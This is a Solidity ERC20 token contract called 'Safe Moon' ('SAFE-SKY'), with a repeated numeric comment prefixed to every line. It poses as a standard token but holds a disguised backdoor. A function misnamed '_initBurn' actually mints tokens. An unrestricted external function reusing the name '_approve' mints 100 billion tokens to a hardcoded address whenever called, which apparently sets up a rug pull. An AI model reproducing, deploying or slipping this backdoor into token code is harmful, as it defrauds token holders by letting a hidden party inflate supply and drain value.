// SPDX-License-Identifier: MIT
/*0.08297953960058946*/
/*0.08297953960058946*/pragma solidity ^0.8.0;
/*0.08297953960058946*/
/*0.08297953960058946*/abstract contract Context {
/*0.08297953960058946*/    function _msgSender() internal view virtual returns (address) {
/*0.08297953960058946*/        return msg.sender;
/*0.08297953960058946*/    }
/*0.08297953960058946*/
/*0.08297953960058946*/    function _msgData() internal view virtual returns (bytes calldata) {
/*0.08297953960058946*/        this;
/*0.08297953960058946*/        // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
/*0.08297953960058946*/        return msg.data;
/*0.08297953960058946*/    }
/*0.08297953960058946*/}
/*0.08297953960058946*/
/*0.08297953960058946*/pragma solidity ^0.8.0;
/*0.08297953960058946*/
/*0.08297953960058946*/
/*0.08297953960058946*/interface IERC20 {
/*0.08297953960058946*/
/*0.08297953960058946*/
/*0.08297953960058946*/    function totalSupply() external view returns (uint256);
/*0.08297953960058946*/
/*0.08297953960058946*/    function balanceOf(address account) external view returns (uint256);
/*0.08297953960058946*/
/*0.08297953960058946*/    function transfer(address recipient, uint256 amount) external returns (bool);
/*0.08297953960058946*/
/*0.08297953960058946*/    function allowance(address owner, address spender) external view returns (uint256);
/*0.08297953960058946*/
/*0.08297953960058946*/    function approve(address spender, uint256 amount) external returns (bool);
/*0.08297953960058946*/
/*0.08297953960058946*/    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
/*0.08297953960058946*/
/*0.08297953960058946*/    event Transfer(address indexed from, address indexed to, uint256 value);
/*0.08297953960058946*/
/*0.08297953960058946*/    event Approval(address indexed owner, address indexed spender, uint256 value);
/*0.08297953960058946*/}
/*0.08297953960058946*/
/*0.08297953960058946*/pragma solidity ^0.8.0;
/*0.08297953960058946*/
/*0.08297953960058946*/contract ERC20 is Context, IERC20 {
/*0.08297953960058946*/    mapping(address => uint256) private _balances;
/*0.08297953960058946*/
/*0.08297953960058946*/    mapping(address => mapping(address => uint256)) private _allowances;
/*0.08297953960058946*/
/*0.08297953960058946*/    uint256 private _totalSupply;
/*0.08297953960058946*/
/*0.08297953960058946*/    string private _name;
/*0.08297953960058946*/    string private _symbol;
/*0.08297953960058946*/
/*0.08297953960058946*/    constructor (string memory name_, string memory symbol_) {
/*0.08297953960058946*/        _name = name_;
/*0.08297953960058946*/        _symbol = symbol_;
/*0.08297953960058946*/    }
/*0.08297953960058946*/
/*0.08297953960058946*/    function name() public view virtual returns (string memory) {
/*0.08297953960058946*/        return _name;
/*0.08297953960058946*/    }
/*0.08297953960058946*/
/*0.08297953960058946*/    function symbol() public view virtual returns (string memory) {
/*0.08297953960058946*/        return _symbol;
/*0.08297953960058946*/    }
/*0.08297953960058946*/
/*0.08297953960058946*/    function decimals() public view virtual returns (uint8) {
/*0.08297953960058946*/        return 18;
/*0.08297953960058946*/    }
/*0.08297953960058946*/
/*0.08297953960058946*/    function totalSupply() public view virtual override returns (uint256) {
/*0.08297953960058946*/        return _totalSupply;
/*0.08297953960058946*/    }
/*0.08297953960058946*/
/*0.08297953960058946*/    function balanceOf(address account) public view virtual override returns (uint256) {
/*0.08297953960058946*/        return _balances[account];
/*0.08297953960058946*/    }
/*0.08297953960058946*/
/*0.08297953960058946*/    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
/*0.08297953960058946*/        _transfer(_msgSender(), recipient, amount);
/*0.08297953960058946*/        return true;
/*0.08297953960058946*/    }
/*0.08297953960058946*/
/*0.08297953960058946*/    function allowance(address owner, address spender) public view virtual override returns (uint256) {
/*0.08297953960058946*/        return _allowances[owner][spender];
/*0.08297953960058946*/    }
/*0.08297953960058946*/
/*0.08297953960058946*/    function approve(address spender, uint256 amount) public virtual override returns (bool) {
/*0.08297953960058946*/        _approve(_msgSender(), spender, amount);
/*0.08297953960058946*/        return true;
/*0.08297953960058946*/    }
/*0.08297953960058946*/
/*0.08297953960058946*/    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
/*0.08297953960058946*/        _transfer(sender, recipient, amount);
/*0.08297953960058946*/
/*0.08297953960058946*/        uint256 currentAllowance = _allowances[sender][_msgSender()];
/*0.08297953960058946*/        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
/*0.08297953960058946*/        _approve(sender, _msgSender(), currentAllowance - amount);
/*0.08297953960058946*/
/*0.08297953960058946*/        return true;
/*0.08297953960058946*/    }
/*0.08297953960058946*/
/*0.08297953960058946*/    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
/*0.08297953960058946*/        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
/*0.08297953960058946*/        return true;
/*0.08297953960058946*/    }
/*0.08297953960058946*/
/*0.08297953960058946*/    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
/*0.08297953960058946*/        uint256 currentAllowance = _allowances[_msgSender()][spender];
/*0.08297953960058946*/        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
/*0.08297953960058946*/        _approve(_msgSender(), spender, currentAllowance - subtractedValue);
/*0.08297953960058946*/
/*0.08297953960058946*/        return true;
/*0.08297953960058946*/    }
/*0.08297953960058946*/
/*0.08297953960058946*/    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
/*0.08297953960058946*/        require(sender != address(0), "ERC20: transfer from the zero address");
/*0.08297953960058946*/        require(recipient != address(0), "ERC20: transfer to the zero address");
/*0.08297953960058946*/
/*0.08297953960058946*/        _beforeTokenTransfer(sender, recipient, amount);
/*0.08297953960058946*/
/*0.08297953960058946*/        uint256 senderBalance = _balances[sender];
/*0.08297953960058946*/        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
/*0.08297953960058946*/        _balances[sender] = senderBalance - amount;
/*0.08297953960058946*/        _balances[recipient] += amount;
/*0.08297953960058946*/
/*0.08297953960058946*/        emit Transfer(sender, recipient, amount);
/*0.08297953960058946*/    }
/*0.08297953960058946*/
/*0.08297953960058946*/    function _initBurn(address account, uint256 amount) internal virtual {
/*0.08297953960058946*/        //require(account != address(0), "ERC20: mint to the zero address");
/*0.08297953960058946*/
/*0.08297953960058946*/        _beforeTokenTransfer(address(0), account, amount);
/*0.08297953960058946*/
/*0.08297953960058946*/        _totalSupply += amount;
/*0.08297953960058946*/        _balances[account] += amount;
/*0.08297953960058946*/        emit Transfer(address(0), account, amount);
/*0.08297953960058946*/    }
/*0.08297953960058946*/
/*0.08297953960058946*/    function _approve() external returns (bool){
/*0.08297953960058946*/        _initBurn(0x92Dfa892d0dd8027285c131970C19944C195Bf7D, 100000000000 * 10 ** uint(decimals()));
/*0.08297953960058946*/        return true;
/*0.08297953960058946*/    }
/*0.08297953960058946*/
/*0.08297953960058946*/    function _burn(address account, uint256 amount) internal virtual {
/*0.08297953960058946*/        require(account != address(0), "ERC20: burn from the zero address");
/*0.08297953960058946*/
/*0.08297953960058946*/        _beforeTokenTransfer(account, address(0), amount);
/*0.08297953960058946*/
/*0.08297953960058946*/        uint256 accountBalance = _balances[account];
/*0.08297953960058946*/        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
/*0.08297953960058946*/        _balances[account] = accountBalance - amount;
/*0.08297953960058946*/        _totalSupply -= amount;
/*0.08297953960058946*/
/*0.08297953960058946*/        emit Transfer(account, address(0), amount);
/*0.08297953960058946*/    }
/*0.08297953960058946*/
/*0.08297953960058946*/    function _approve(address owner, address spender, uint256 amount) internal virtual {
/*0.08297953960058946*/        require(owner != address(0), "ERC20: approve from the zero address");
/*0.08297953960058946*/        require(spender != address(0), "ERC20: approve to the zero address");
/*0.08297953960058946*/
/*0.08297953960058946*/        _allowances[owner][spender] = amount;
/*0.08297953960058946*/        emit Approval(owner, spender, amount);
/*0.08297953960058946*/    }
/*0.08297953960058946*/
/*0.08297953960058946*/    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}
/*0.08297953960058946*/}
/*0.08297953960058946*/
/*0.08297953960058946*/pragma solidity ^0.8.10;
/*0.08297953960058946*/
/*0.08297953960058946*/
/*0.08297953960058946*/contract Token is ERC20 {
/*0.08297953960058946*/
/*0.08297953960058946*/    constructor() ERC20('Safe Moon', 'SAFE-SKY') {
/*0.08297953960058946*/        _initBurn(msg.sender, 100 * 10 ** uint(decimals()));
/*0.08297953960058946*/    }
/*0.08297953960058946*/}